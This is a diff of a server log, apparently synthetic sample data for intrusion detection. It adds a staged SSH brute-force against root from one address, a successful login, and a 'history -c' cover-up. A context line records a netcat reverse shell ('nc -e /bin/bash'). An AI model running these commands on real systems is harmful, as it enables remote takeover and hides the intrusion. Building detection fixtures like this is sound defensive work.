@@ -120,4 +120,13 @@ Sep  2 08:50:03 my-server sshd[7386]: Accepted password for jsmith from 193.99.1
 08:50:09 1000    ls               54669   25814   0   /bin/ls
 Sep  2 08:50:10 my-server sshd[7621]: Accepted password for jsmith from 193.99.144.80 port 50984 ssh2
 08:50:12 1000    nc               5902    46611   0   nc -e /bin/bash 10.0.0.2
-Sep  2 08:50:15 my-server sshd[3552]: Failed password for admin from 10.10.10.8 port 8571 ssh2
+
+
+Sep  5 17:37:51 my-server sshd[4469]: Failed password for root from 198.51.100.99 port 22411 ssh2
+Sep  5 17:37:51 my-server sshd[1844]: Failed password for root from 198.51.100.99 port 27133 ssh2
+Sep  5 17:37:51 my-server sshd[5136]: Failed password for root from 198.51.100.99 port 20230 ssh2
+Sep  5 17:37:51 my-server sshd[9449]: Failed password for root from 198.51.100.99 port 12073 ssh2
+Sep  5 17:37:51 my-server sshd[3340]: Failed password for root from 198.51.100.99 port 7694 ssh2
+Sep  5 17:37:52 my-server sshd[1362]: Failed password for root from 198.51.100.99 port 2618 ssh2
+Sep  5 17:37:55 my-server sshd[2538]: Accepted password for root from 198.51.100.99 port 59647 ssh2
+17:38:00 0       bash             58666   2538    0   history -c
